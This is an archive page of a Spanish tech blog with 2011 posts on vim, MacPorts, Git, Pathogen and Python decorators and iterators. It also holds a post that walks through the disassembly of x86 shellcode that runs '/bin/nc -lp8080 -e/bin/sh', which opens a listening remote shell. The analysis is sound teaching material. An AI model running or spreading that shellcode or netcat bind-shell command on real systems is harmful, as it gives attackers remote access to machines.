@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# " lang="es">
+<head>
+<meta charset="utf-8">
+<base href="http://deibit.com/index-8.html">
+<meta name="description" content="This is a demo site for Nikola.">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>deibit (publicaciones antiguas, página 8) | deibit</title>
+<link href="assets/css/all-nocdn.css" rel="stylesheet" type="text/css">
+<meta content="#5670d4" name="theme-color">
+<link rel="alternate" type="application/rss+xml" title="RSS" href="rss.xml">
+<link rel="canonical" href="http://deibit.com/index-8.html">
+<link rel="prev" href="index-9.html" type="text/html">
+<link rel="next" href="index-7.html" type="text/html">
+<!--[if lt IE 9]><script src="assets/js/html5.js"></script><![endif]-->
+</head>
+<body>
+<a href="#content" class="sr-only sr-only-focusable">Ir al contenido principal</a>
+
+<!-- Menubar -->
+
+<nav class="navbar navbar-inverse navbar-static-top"><div class="container">
+<!-- This keeps the margins nice -->
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-navbar" aria-controls="bs-navbar" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="http://deibit.com/">
+
+                <span id="blog-title">deibit</span>
+            </a>
+        </div>
+<!-- /.navbar-header -->
+        <div class="collapse navbar-collapse" id="bs-navbar" aria-expanded="false">
+            <ul class="nav navbar-nav">
+<li>
+<a href="archive.html">Archivo</a>
+                </li>
+<li>
+<a href="categories/">Etiquetas</a>
+                </li>
+<li>
+<a href="rss.xml">Canal RSS</a>
+
+                
+            </li>
+</ul>
+<ul class="nav navbar-nav navbar-right"></ul>
+</div>
+<!-- /.navbar-collapse -->
+    </div>
+<!-- /.container -->
+</nav><!-- End of Menubar --><div class="container" id="content" role="main">
+    <div class="body-content">
+        <!--Body content-->
+        <div class="row">
+            
+            
+
+    
+<div class="postindex">
+    <article class="h-entry post-text"><header><h1 class="p-name entry-title"><a href="posts/2011/06/28/vim-copiando-a-traves-de-ssh/" class="u-url">vim, copiando a través de SSH</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn">
+                David García
+            </span></p>
+            <p class="dateline"><a href="posts/2011/06/28/vim-copiando-a-traves-de-ssh/" rel="bookmark"><time class="published dt-published" datetime="2011-06-28T09:01:09+02:00" title="2011-06-28 09:01">2011-06-28 09:01</time></a></p>
+        </div>
+    </header><div class="e-content entry-content">
+    <p>Lo primero, ajustamos mouse a null :set mouse=</p>
+<p>Ahora pasamos a modo insert y con el botón derecho del mouse podemos copiar la selección sin ningún tipo de perdida de formato de origen.</p>
+
+    </div>
+    </article><article class="h-entry post-text"><header><h1 class="p-name entry-title"><a href="posts/2011/04/22/usando-macports/" class="u-url">Usando MacPorts</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn">
+                David García
+            </span></p>
+            <p class="dateline"><a href="posts/2011/04/22/usando-macports/" rel="bookmark"><time class="published dt-published" datetime="2011-04-22T07:51:33+02:00" title="2011-04-22 07:51">2011-04-22 07:51</time></a></p>
+        </div>
+    </header><div class="e-content entry-content">
+    <p>Una de las carencias de los Macs es que le faltan ciertas librerías o que son anticuadas. Por ejemplo, la versión de GCC que trae por defecto (previa instalación de XCode) es la 4.2.1. Para paliar esa falta hay varias opciones: <a href="https://github.com/mxcl/homebrew">Homebrew</a>, <a href="http://www.macports.org/">MacPorts</a> y <a href="http://www.finkproject.org/">Finks</a>. </p>
+<p>Personalmente uso MacPorts, aunque no he probado los otros, dejo aquí algunos comandos que siempre termino reaprendiendo cada vez que tengo que echar mano de él.</p>
+<p><strong>Buscar algún programa o librería:</strong></p>
+<p>$ port search “palabra”</p>
+<p>Admite varias opciones como: –glob, –regex, –line y –case-sensitive entre otras.</p>
+<p><strong>Instalar:</strong></p>
+<p>$ sudo port install “paquete”</p>
+<p><strong>Desinstalar:</strong></p>
+<p>$ sudo port uninstall “paquete”</p>
+<p>Entre las opciones, permite cargarse o no las dependencias y/o dependencias inversas.</p>
+<p><strong>¿Que tengo instalado?</strong></p>
+<p>$ port installed</p>
+<p><strong>Desinstala los que estén inactivos:</strong></p>
+<p>$ sudo port uninstall inactive</p>
+<p>Me explico. Por defecto MacPorts no desinstala la versión anterior cuando actualizamos (para no romper dependencias) pero si queremos que las borre lo podemos hacer indicando “inactive” a la orden uninstall.</p>
+<p><strong>Actualizar MacPort:</strong></p>
+<p>$ sudo port selfudate</p>
+<p>Esto es para actualizar “port”, la herramienta en si.</p>
+<p><strong>Actualizar paquetes:</strong></p>
+<p>$ sudo port upgrade outdated</p>
+<p><strong>Información sobre un paquete:</strong></p>
+<p>$ port info “paquete”</p>
+<p><strong>Dependencias de un paquete:</strong></p>
+<p>$ port deps “paquete”</p>
+<p>y las inversas: $ port dependents “paquete” </p>
+<p><strong>Hay bastantes más opciones, el programa es muy versátil e intuitivo, si queremos más información: </strong></p>
+<p>$ port help<br>
+o<br>
+$ port help “comando”</p>
+
+    </div>
+    </article><article class="h-entry post-text"><header><h1 class="p-name entry-title"><a href="posts/2011/04/19/actualizacion-del-tema-deibit-fondo-blanco-para-vim/" class="u-url">Actualización del tema "DeiBit" (fondo blanco) para vim</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn">
+                David García
+            </span></p>
+            <p class="dateline"><a href="posts/2011/04/19/actualizacion-del-tema-deibit-fondo-blanco-para-vim/" rel="bookmark"><time class="published dt-published" datetime="2011-04-19T10:14:10+02:00" title="2011-04-19 10:14">2011-04-19 10:14</time></a></p>
+        </div>
+    </header><div class="e-content entry-content">
+    <p>He actualizado el tema “DeiBit” de factura propia. Por si ha alguien le es útil.</p>
+<p>Se trata de un tema con fondo blanco, barras en celeste y linea actual en amarillo (para no perderse vamos).</p>
+<p><a href="http://daganu.files.wordpress.com/2011/04/deibit.png"><img src="http://daganu.files.wordpress.com/2011/04/deibit.png?w=300" alt="" title="deibit" width="300" height="234" class="aligncenter size-medium wp-image-278"></a></p>
+<p>El código aquí: <a href="http://pastebin.com/QMEZPB1s">http://pastebin.com/QMEZPB1s</a></p>
+
+    </div>
+    </article><article class="h-entry post-text"><header><h1 class="p-name entry-title"><a href="posts/2011/04/19/vim-configurar-de-una-vez-por-todas-omnicppcomplete/" class="u-url">vim: Configurar (de una vez por todas) OmniCppComplete</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn">
+                David García
+            </span></p>
+            <p class="dateline"><a href="posts/2011/04/19/vim-configurar-de-una-vez-por-todas-omnicppcomplete/" rel="bookmark"><time class="published dt-published" datetime="2011-04-19T06:50:15+02:00" title="2011-04-19 06:50">2011-04-19 06:50</time></a></p>
+        </div>
+    </header><div class="e-content entry-content">
+    <p>Una de las cosas que me traían mosqueado era el autocompletado en Vim para el lenguaje C++ (el lenguaje más complejo inventado por un ser humano). Para ello disponíamos de un plugin llamado “<a href="http://www.vim.org/scripts/script.php?script_id=1520">OmniCppComplete</a>” que venía a paliar la falta de una buena función de completado para C++ (se tiraba, hasta donde llegaba de la de C).</p>
+<p>El problema es que hay distintas configuraciones para OmniCppComplete pululando por ahí, y entre experimentos y pruebas ninguna parecía funcionar; entre otras cosas por el quasihackeo que hay que hacerle a las cabeceras de la STL para poder obtener el ansiado completado cuando usamos esta librería.</p>
+<p>La base de OmniCppComplete son los archivos generados por la herramienta “ctags”. Por cada librería que usemos, si queremos disponer del autocompletado debemos generar un archivo ctags. Y no de cualquier forma. Si variamos la configuración de ctags es posible que no obtengamos el resultado previsto.</p>
+<p>A esto hay que sumarle la configuración del propio OmniCppComplete en nuestro “vimrc”, aquí dejo la que me ha funcionado con comentarios:</p>
+<p>[sourcecode]<br>
+" Directorios donde encontrar ctags<br>
+set tags+=~/.vim/.tags/stl<br>
+set tags+=./tags</p>
+<p>" Mapeado para generar ctags de nuestro proyecto<br>
+noremap &lt;F12&gt; :!ctags -R –c++-kinds=+p –fields=+iaS –extra=+q .&lt;cr&gt;<br>
+inoremap &lt;F12&gt; &lt;Esc&gt;:!ctags -R –c++-kinds=+p –fields=+iaS –extra=+q .&lt;cr&gt; </p>
+<p>" Opciones para OmniCppComplete<br>
+let OmniCpp_NamespaceSearch = 1<br>
+let OmniCpp_GlobalScopeSearch = 1<br>
+let OmniCpp_ShowAccess = 1<br>
+let OmniCpp_MayCompleteDot = 1<br>
+let OmniCpp_MayCompleteArrow = 1<br>
+let OmniCpp_MayCompleteScope = 1<br>
+let OmniCpp_DefaultNamespaces = ["std", "_GLIBCXX_STD"] </p>
+<p>" Opciones para el menu de completado<br>
+au CursorMovedI,InsertLeave * if pumvisible() == 0|silent! pclose|endif<br>
+set completeopt=menuone,menu,longest,preview<br>
+[/sourcecode]</p>
+<p>En “~/.vim/.tags” voy dejando los archivos ctags de las librerías típicas: stl, boost, Qt… y en “./tags” se dejan las tags del proyecto actual. </p>
+<p>Hay que acordarse de actualizar la variable “OmniCpp_DefaultNamespaces” con los espacios de nombres que agreguemos.</p>
+<p><strong>Generando las tags para la STL</strong></p>
+<p>Una de las primeras cosas que querremos es el completado para STL. Hay que bajar las cabeceras preparadas para procesarlas por ctags desde <a href="http://www.vim.org/scripts/script.php?script_id=2358">aquí</a>. </p>
+<p>Luego sobre el directorio descomprimido:</p>
+<p>[sourcecode language="bash"]<br>
+ctags -R –c++-kinds=+p –fields=+iaS –extra=+q –language-force=C++ cpp_src<br>
+[/sourcecode]</p>
+<p>Y ya tenemos nuestro archivo de tags para copiarlo a “~/vim/.tags” o donde queramos (siempre que luego lo reflejemos en el vimrc con tags+=).</p>
+<p>Una captura con el completado:</p>
+<p><a href="http://daganu.files.wordpress.com/2011/04/stlcompletion.png"><img src="http://daganu.files.wordpress.com/2011/04/stlcompletion.png?w=300" alt="" title="stlcompletion" width="300" height="253" class="aligncenter size-medium wp-image-274"></a></p>
+
+    </div>
+    </article><article class="h-entry post-text"><header><h1 class="p-name entry-title"><a href="posts/2011/04/17/salida-a-color-en-git/" class="u-url">Salida a color en Git</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn">
+                David García
+            </span></p>
+            <p class="dateline"><a href="posts/2011/04/17/salida-a-color-en-git/" rel="bookmark"><time class="published dt-published" datetime="2011-04-17T22:19:20+02:00" title="2011-04-17 22:19">2011-04-17 22:19</time></a></p>
+        </div>
+    </header><div class="e-content entry-content">
+    <p>Por defecto Git no usa colores en la salida de los comandos por linea. Si trabajamos bastante con la consola tener la salida a color se agradece, sobre todo para ver los parches. </p>
+<p>Para añadir esa opción en Git hay que establecer a ‘true’ uno de los valores globales de su configuración:</p>
+<p>[sourcecode]<br>
+git config –global color.ui true<br>
+[/sourcecode]</p>
+
+    </div>
+    </article><article class="h-entry post-text"><header><h1 class="p-name entry-title"><a href="posts/2011/04/13/analizando-un-shellcode-iii/" class="u-url">Analizando un shellcode (III)</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn">
+                David García
+            </span></p>
+            <p class="dateline"><a href="posts/2011/04/13/analizando-un-shellcode-iii/" rel="bookmark"><time class="published dt-published" datetime="2011-04-13T21:02:44+02:00" title="2011-04-13 21:02">2011-04-13 21:02</time></a></p>
+        </div>
+    </header><div class="e-content entry-content">
+    <p>Hasta ahora hemos visto como está estructurado el shellcode y como se produce la llamada al sistema. También hemos comentado como se produce un salto hacia el final (donde se encuentra “/bin/nc -lp8080 -e/bin/sh”) y vuelta hacia delante para obtener un pivote hacia la cadena.</p>
+<p>Vamos a ver como se ejecutan las instrucciones del shellcode para elaborar los argumentos que faltan y para pasarlos a la llamada al sistema. Recordemos que esta llamada al sistema precisa de 3 argumentos:</p>
+<p>[sourcecode language="cpp"]<br>
+int execve(const char *filename, char *const argv[], char *const envp[]);<br>
+[/sourcecode]</p>
+<p><strong>Filename</strong>: un nombre de archivo (un puntero a una cadena)</p>
+<p><strong>argv</strong>:        un puntero a un array de punteros a char (cadenas) que serán los argumentos a pasar al programa.</p>
+<p><strong>envp</strong>:       un puntero a un array de punteros a char (más cadenas) donde podemos pasar variables de entorno para el proceso a crear.</p>
+<p><strong>Y ahora dos preguntas:</strong></p>
+<p>¿No deben los arrays de punteros a cadenas terminar con un ’0′ cada cadena?<br>
+¿No deben no contener el carácter ’0′ los shellcodes?</p>
+<p>Esto es lo que hace el resto del código que aun no hemos comentado aun, modificar la cadena que ya está en memoria para ir creando los caracteres que faltan e ir posicionando las partes precisas para que luego las podamos meter en los registros que van a servir para la llamada la sistema.</p>
+<p>Y aquí también es donde entra la magia o arte del shellcoding: cuantas menos instrucciones más pequeño y cuanto más pequeño mejor.</p>
+<p>Bien, tenemos el código:</p>
+<p>[sourcecode]<br>
+(gdb) x/30i shellcode<br>
+   0x804a040 &lt;shellcode&gt;:	jmp    0x804a06c &lt;shellcode+44&gt;<br>
+   0x804a042 &lt;shellcode+2&gt;:	pop    %esi<br>
+   0x804a043 &lt;shellcode+3&gt;:	xor    %eax,%eax<br>
+   0x804a045 &lt;shellcode+5&gt;:	mov    %al,0x7(%esi)<br>
+   0x804a048 &lt;shellcode+8&gt;:	mov    %al,0xf(%esi)<br>
+   0x804a04b &lt;shellcode+11&gt;:	mov    %al,0x19(%esi)<br>
+   0x804a04e &lt;shellcode+14&gt;:	mov    %esi,0x1a(%esi)<br>
+   0x804a051 &lt;shellcode+17&gt;:	lea    0x8(%esi),%ebx<br>
+   0x804a054 &lt;shellcode+20&gt;:	mov    %ebx,0x1e(%esi)<br>
+   0x804a057 &lt;shellcode+23&gt;:	lea    0x10(%esi),%ebx<br>
+   0x804a05a &lt;shellcode+26&gt;:	mov    %ebx,0x22(%esi)<br>
+   0x804a05d &lt;shellcode+29&gt;:	mov    %eax,0x26(%esi)<br>
+   0x804a060 &lt;shellcode+32&gt;:	mov    $0xb,%al<br>
+   0x804a062 &lt;shellcode+34&gt;:	mov    %esi,%ebx<br>
+   0x804a064 &lt;shellcode+36&gt;:	lea    0x1a(%esi),%ecx<br>
+   0x804a067 &lt;shellcode+39&gt;:	lea    0x26(%esi),%edx<br>
+   0x804a06a &lt;shellcode+42&gt;:	int    $0x80<br>
+   0x804a06c &lt;shellcode+44&gt;:	call   0x804a042 &lt;shellcode+2&gt;<br>
+   0x804a071 &lt;shellcode+49&gt;:	das              &lt;——————- COMIENZO DE CADENA<br>
+   0x804a072 &lt;shellcode+50&gt;:	bound  %ebp,0x6e(%ecx)<br>
+   0x804a075 &lt;shellcode+53&gt;:	das<br>
+[/sourcecode]</p>
+<p>y tenemos la cadena:</p>
+<p>[sourcecode]<br>
+00001070  ff 2f 62 69 6e 2f 6e 63  23 2d 6c 70 38 30 38 30  |./bin/nc#-lp8080|<br>
+00001080  23 2d 65 2f 62 69 6e 2f  73 68 23 00 44 69 72 3a  |#-e/bin/sh#.Dir:|<br>
+[/sourcecode]</p>
+<p>Esto último es la salida del comando hexdump, donde el carácter ‘/’ que en hexadecimal es ’2f’. La dirección de comienzo de la cadena será: 0x804a071. Esta dirección, lo volvemos a repetir, la conoce el shellcode al saltar hacia “call 0x804a042″, se produce la llamada y se carga en la pila la dirección de retorno que es exactamente donde empieza la cadena. Al ir a la dirección de la llamada lo primero que se hace es pop a ESI donde se carga esta dirección. Es en este registro donde tenemos el pivote hacia la cadena.</p>
+<p>La siguiente instrucción es un “xor %eax,%eax” que no es otra cosa que poner a ’0′ el registro EAX. Ya tenemos el cero que andábamos buscando.</p>
+<p><strong>Siguientes instrucciones:</strong></p>
+<p>[sourcecode]<br>
+   0x804a045 &lt;shellcode+5&gt;:	mov    %al,0x7(%esi)<br>
+   0x804a048 &lt;shellcode+8&gt;:	mov    %al,0xf(%esi)<br>
+   0x804a04b &lt;shellcode+11&gt;:	mov    %al,0x19(%esi)<br>
+[/sourcecode]<br>
+”<br>
+AL es el último byte (el de menor peso) del registro EAX, que tiene el valor de ’00′. Este valor va a ser “copiado” a ESI + 0x7, ESI + 0xF y ESI + 19.</p>
+<p>Como ESI vale 0x804a071 podemos hacer nuestras cuentas:</p>
+<p>0x804a071 + 0x7  =  0x804a079<br>
+0x804a071 + 0xF  =  0x804a080<br>
+0x804a071 + 0x19 = 0x804a08A</p>
+<p>Direcciones que se corresponden con las letras de la cadena: primer ‘#’, segundo ‘#’ y tercer ‘#’. Prácticamente un reemplazo de los caracteres ‘#’ por ’0′.</p>
+<p>La cadena queda partida en 3 subcadenas: </p>
+<p>/bin/nc   -lp8080   -e/bin/sh</p>
+<p><strong>Siguiente grupo:</strong></p>
+<p>[sourcecode]<br>
+   0x804a04e &lt;shellcode+14&gt;:	mov    %esi,0x1a(%esi)<br>
+   0x804a051 &lt;shellcode+17&gt;:	lea    0x8(%esi),%ebx<br>
+   0x804a054 &lt;shellcode+20&gt;:	mov    %ebx,0x1e(%esi)<br>
+   0x804a057 &lt;shellcode+23&gt;:	lea    0x10(%esi),%ebx<br>
+   0x804a05a &lt;shellcode+26&gt;:	mov    %ebx,0x22(%esi)<br>
+   0x804a05d &lt;shellcode+29&gt;:	mov    %eax,0x26(%esi)<br>
+[/sourcecode]</p>
+<p>Instrucción por instrucción:</p>
+<p>1.- Mueve el valor de ESI (dirección de comienzo de la cadena) al final de la cadena ESI+0x1A. Ojo, aquí tenemos una dirección que apunta a la primera subcadena: “/bin/nc”<br>
+2.- Carga en EBX el valor de la dirección efectiva (Load Effective Address) de ESI+0x8. Que es donde comienza la siguiente subcadena: “-lp8080″ ¿No es un buen lugar para comenzar un array de cadenas?<br>
+3.- Mueve a ESI+0x22 el valor de EBX. Ya tenemos al final de la cadena la dirección de la primera subcadena seguido de la dirección de la segunda.<br>
+4.- Carga en EBX el valor de la dirección efectiva de ESI + 0x10. Esto nos deja en EBX la dirección 0x804a081 que es la subcadena “-e/bin/sh”<br>
+5.- Mueve el valor que hay en EBX (la dirección de la ultima subcadena) a ESI+0x22. Ya tenemos al final de la cadena las 3 direcciones de las subcadenas.<br>
+6.- Mueve EAX que vale 0x00000000 a ESI+0x26</p>
+<p>Al final terminamos con este layout al final de la cadena original del shellcode:</p>
+<p>FINAL DE LA CADENA | DIRECCIÓN PRIMERA SUBCADENA | DIRECCIÓN SEGUNDA SUBCADENA | DIRECCIÓN ULTIMA SUBCADENA | 0x00000000</p>
+<p><strong>Cargamos parámetros para la llamada al sistema</strong></p>
+<p>[sourcecode]<br>
+   0x804a060 &lt;shellcode+32&gt;:	mov    $0xb,%al<br>
+   0x804a062 &lt;shellcode+34&gt;:	mov    %esi,%ebx<br>
+   0x804a064 &lt;shellcode+36&gt;:	lea    0x1a(%esi),%ecx<br>
+   0x804a067 &lt;shellcode+39&gt;:	lea    0x26(%esi),%edx<br>
+   0x804a06a &lt;shellcode+42&gt;:	int    $0x80<br>
+[/sourcecode]</p>
+<p>1.- En AL cargamos el valor 0xb que es 11 y que es el código de la llamada al sistema de “<a href="http://linux.die.net/man/2/execve">execv</a>”<br>
+2.- Cargamos ESI en EBX para el primer parámetro que es el archivo a ejecutar. En este caso “/bin/nc” la herramienta NetCat.<br>
+3.- Cargamos en ECX para el segundo parámetro el puntero a la siguiente subcadena que hará de puntero a array de cadenas y que contendrá los parámetros a pasar a NetCat que nos son otros que “-lp8080″ y “-e/bin/sh”.<br>
+4.- Cargamos en EDX, el tercer parámetro para la llamada al sistema, el valor apuntado por ESI+0x26 que es como recordamos 0x00000000 o lo que es lo mismo, le estamos pasando un puntero nulo para decirle que no vamos a usar ese parámetro.<br>
+5.- INT $0x80, sobran explicaciones: Si todo a ido bien esta interrupción le dice al núcleo que ejecute nuestra llamada y por lo tanto se cree un proceso que abrirá una shell a la escucha en el puerto 8080 de la máquina remota.</p>
+<p><em>Tengo una bonita demostración para este shellcode pero no me queda espacio en este post. Lo dejo para otro.</em></p>
+<p><strong>Entradas anteriores</strong></p>
+<p><a href="http://prisonernumbersix.com/2011/01/19/analizando-un-shellcode-i/">Analizando un shellcode I</a><br><a href="http://prisonernumbersix.com/2011/02/12/analizando-un-shellcode-ii/">Analizando un shellcode II</a></p>
+
+    </div>
+    </article><article class="h-entry post-text"><header><h1 class="p-name entry-title"><a href="posts/2011/04/11/vim-github-y-pathogen/" class="u-url">vim, Git, GitHub y Pathogen</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn">
+                David García
+            </span></p>
+            <p class="dateline"><a href="posts/2011/04/11/vim-github-y-pathogen/" rel="bookmark"><time class="published dt-published" datetime="2011-04-11T22:14:58+02:00" title="2011-04-11 22:14">2011-04-11 22:14</time></a></p>
+        </div>
+    </header><div class="e-content entry-content">
+    <p>Cuando tienes más de una máquina y Vim (o cualquier otro programa) instalado en algunas de ellas, resulta tedioso ir copiando y manteniendo al día tu archivo de configuración (.vimrc) y los diversos plugins, archivos de sintaxis o esquemas de colores.</p>
+<p>Una de las soluciones que usaba era <a href="https://www.dropbox.com">DropBox</a>. Tenía una carpeta donde lo guardaba todo e iba subiendo y bajando a base de linea de comandos. Bastante cómodo la verdad.</p>
+<p>Usar un gestor de versiones no es una idea nueva. Hay gente que usa Subversion para gestionar documentación con bastante éxito. </p>
+<p>Bueno, la idea es usar Git para ese control de versiones. Alojar el repositorio en <a href="https://github.com/">GitHub</a> por comodidad y usar Pathogen (es un plugin para Vim) para cierta “magia” con los plugins.</p>
+<p><strong>Lo primero es instalar Git y que éste responda desde la linea de comandos</strong> (hay miles de guías para hacerlo). Y luego tener una cuenta en GitHub (es gratuito). Vamos, uno de los requisitos es saber manejar Git de manera básica.</p>
+<p>1.- Movemos  nuestro .vimrc a ~/.vim/vimrc (sin el ‘.’, no hace falta que esté oculto)</p>
+<p>[sourcecode language="bash"]<br>
+mv ~/.vimrc ~/.vim/vimrc<br>
+[/sourcecode]</p>
+<p>2.- Creamos un enlace simbólico para que Vim lo encuentre:</p>
+<p>[sourcecode language="bash"]<br>
+ln -s ~/.vim/vimrc ~/.vimrc<br>
+[/sourcecode]</p>
+<p>3.- Hacemos que nuestro .vim sea un repositorio de Git y agregamos los archivos iniciales:</p>
+<p>[sourcecode language="bash"]<br>
+cd ~/.vim<br>
+git init<br>
+git add .<br>
+git commit -m "Commit inicial"<br>
+[/sourcecode]</p>
+<p>4.- Instalamos “<a href="https://github.com/tpope/vim-pathogen">Pathogen</a>“.</p>
+<p>Para instalar Pathogen tan solo hay que guardar el archivo pathogen.vim en la carpeta: ~/.vim/autoload y agregar las dos lineas siguientes a nuestro .vimrc:</p>
+<p>[sourcecode]<br>
+call pathogen#runtime_append_all_bundles()<br>
+call pathogen#helptags()<br>
+[/sourcecode]</p>
+<p>También creamos la carpeta ~/.vim/bundle</p>
+<p>Ahí, en esa carpeta es donde vamos a ir guardando todos los plugins. La gracia de esto es que tenemos <a href="https://github.com/vim-scripts">tooooodos los plugins que queramos</a> pero en PATHs independientes. Cada uno en su carpeta, bien ordenados sin necesidad de crear archivos sueltos por todo el .vim</p>
+<p>Basta descomprimir la carpeta de un plugin en bundle, PATHogen se encarga del resto. Pero la gracia de todo esto es que en el mismo GitHub vamos a encontrar miles de plugins y otros para Vim.</p>
+<p>¿Que significa esto?</p>
+<p>Que vamos a poder instalar plugins y poder actualizarlos desde Git. </p>
+<p>¿Como?</p>
+<p>Cada plugin irá instalado independientemente como un “submodulo” de Git en la carpeta bundle.</p>
+<p>Se acabo tener los plugins sueltos y desactualizados y el desastre que suponía el proceder a borrar alguno. Ahora si no queremos un plugin simplemente borramos la carpeta con Git y listo.</p>
+<p>Naturalmente no hace falta Git ni GitHub para trabajar con Pathogen, pero el complemento es perfecto.</p>
+<p>5.- Creamos un repositorio en GitHub, vamos a suponer que lo llamamos “vimdots”</p>
+<p>El proceso para crear un repositorio en GitHub viene perfectamente explicado en sus guías.</p>
+<p>6.- Agregar repositorio remoto a nuestro repositorio local.</p>
+<p>Esto es, asociar el repositorio que hemos creado en GitHub a lo que tenemos ya en nuestro repositorio “.vim” local. La orden sería:</p>
+<p>[sourcecode]<br>
+cd ~/.vim<br>
+git remote add origin git@github.com:deibit/vimdots.git<br>
+git push -u origin master<br>
+[/sourcecode]</p>
+<p>Por supuesto con el nombre de nuestra cuenta y el nombre del repositorio GitHub que le hemos dado.</p>
+<p> 7.- Agregamos plugins y creamos submodulos para ellos.</p>
+<p>Lo ideal aquí sería <a href="https://github.com/vim-scripts">encontrar los plugins que deseemos en GitHub</a> y agregarlos simplemente con esta orden:</p>
+<p>Vamos a usar como ejemplo el plugin vim-fugitive que nos integra Git en Vim.</p>
+<p>[sourcecode]<br>
+cd ~/.vim<br>
+git submodule add http://github.com/tpope/vim-fugitive.git bundle/fugitive<br>
+[/sourcecode]</p>
+<p>Lo recomendable después de agregar, como cualquier fichero, es hacer push:</p>
+<p>[sourcecode]<br>
+git commit -am "Agregado plugin vim-fugitive"<br>
+git push -u origin master<br>
+[/sourcecode]</p>
+<p>Con esto vamos creando submodulos que son repositorios Git dentro de un repositorio Git.</p>
+<p>Los submodulos se pueden actualizar de golpe con:</p>
+<p>[sourcecode]<br>
+git submodule update<br>
+[/sourcecode]</p>
+<p><strong>ACTUALIZACIÓN</strong></p>
+<p>Se me olvidó comentar como hacemos para instalar este tinglado en otro ordenador. Es fácil. Lo primero es decirle a git que clone nuestro repositorio de GitHub en el directorio por defecto de Vim (~/.vim). Luego como nuestros plugins están en el directorio bundles y son a su vez repositorios de Git (ver el archivo .gitmodules) debemos de decirle a Git que proceda a instalarlos y actualizarlos también:</p>
+<p>[sourcecode]<br>
+git clone https://deibit@github.com/deibit/vimdots.git ~/.vim<br>
+git submodule init<br>
+git submodule update<br>
+[/sourcecode]</p>
+<p>Lo último es enlazar el vimrc de nuestro repositorio local en .vim al home que es donde Vim irá a buscarlo cuando arranque:</p>
+<p>[sourcecode]<br>
+ln -s ~/.vim/vimrc ~/.vimrc<br>
+[/sourcecode]</p>
+
+    </div>
+    </article><article class="h-entry post-text"><header><h1 class="p-name entry-title"><a href="posts/2011/04/09/decoradores-en-python/" class="u-url">Decoradores en Python</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn">
+                David García
+            </span></p>
+            <p class="dateline"><a href="posts/2011/04/09/decoradores-en-python/" rel="bookmark"><time class="published dt-published" datetime="2011-04-09T08:16:47+02:00" title="2011-04-09 08:16">2011-04-09 08:16</time></a></p>
+        </div>
+    </header><div class="e-content entry-content">
+    <p>Los decoradores nos permiten agregar funcionalidad adicional a una función o clase. En Python hay algunos decoradores definidos por el propio lenguaje. Así, cuando queremos declarar a una función de una clase como “estática” o “método de clase” podemos usar un decorador. Las “properties” o propiedades también usan el mecanismo del decorador.</p>
+<p>Anteriormente, antes de los decoradores, la sintaxis para declarar una función estática sin decorador era la siguiente:</p>
+<p>[sourcecode language="python"]<br>
+def mi_funcion():<br>
+    pass<br>
+mi_funcion = staticmethod(mi_funcion)<br>
+[/sourcecode]</p>
+<p>Con el decorador, la sintaxis cambia y queda de la siguiente manera:</p>
+<p>[sourcecode language="python"]<br>
+@staticmethod<br>
+def mi_funcion():<br>
+    pass<br>
+[/sourcecode]</p>
+<p><strong>¿Como funciona un decorador?</strong></p>
+<p>Un decorador es una función que recibe como parámetro la función a decorar y define en su cuerpo a otra función que recibe los parámetros que va a usar la función a decorar (lioso ¿verdad?). Al final se termina devolviendo la función definida en el cuerpo del decorador. Un ejemplo lo explica mejor:</p>
+<p>[sourcecode language="python"]<br>
+def decorador(funcion_a_decorar):<br>
+    def funcion_definida_dentro_del_decorador(*args):<br>
+        print "decorador: aqui podriamos introducir las instrucciones del decorador"<br>
+        funcion_a_decorar(args[0]+1, args[1]+1)<br>
+        print "seguimos en el decorador"<br>
+    return funcion_definida_dentro_del_decorador</p>
+<p>@decorador<br>
+def a_decorar(x,y):<br>
+    print x+y<br>
+[/sourcecode]</p>
+<p>Cuando se define el decorador vemos que recibe como parámetros la función a decorar y que dentro define una función que va a retornar.</p>
+<p>Dentro de la función que retorna (funcion_definida…) se hace uso de la funcion_a_decorar porque obviamente se ha de ejecutar su contenido. Como podemos ver a continuación de la ejecución de la función a decorar se siguen ejecutando instrucciones del decorador.</p>
+<p>Si observamos, la función de dentro del decorador recibe los parámetros (en este caso como no sabemos de antemano su número usamos una lista) de la función a decorar.</p>
+<p><strong>¿Que usos podríamos darle?</strong></p>
+<p>Por ejemplo, en una aplicación web, podemos usar un decorador en las funciones de administración para comprobar que efectivamente el usuario es administrador.<br>
+Otro uso podría ser el de ejecutar una traza de debug cuando se va a entrar en la función a estudiar.</p>
+
+    </div>
+    </article><article class="h-entry post-text"><header><h1 class="p-name entry-title"><a href="posts/2011/04/05/iteradores-en-python/" class="u-url">Iteradores en Python</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn">
+                David García
+            </span></p>
+            <p class="dateline"><a href="posts/2011/04/05/iteradores-en-python/" rel="bookmark"><time class="published dt-published" datetime="2011-04-05T20:03:36+02:00" title="2011-04-05 20:03">2011-04-05 20:03</time></a></p>
+        </div>
+    </header><div class="e-content entry-content">
+    <p>Un iterador es un objeto sobre el que se puede…iterar. Aunque parece una obviedad es así. No puedes iterar sobre un número o tipo entero, ya que carece de la capacidad de iterar. Pero por ejemplo una lista si tiene esa capacidad:</p>
+<p>[sourcecode]<br>
+&gt;&gt;&gt; for n in [1,2,3]:<br>
+…     print n<br>
+…<br>
+1<br>
+2<br>
+3<br>
+&gt;&gt;&gt;<br>
+[/sourcecode]</p>
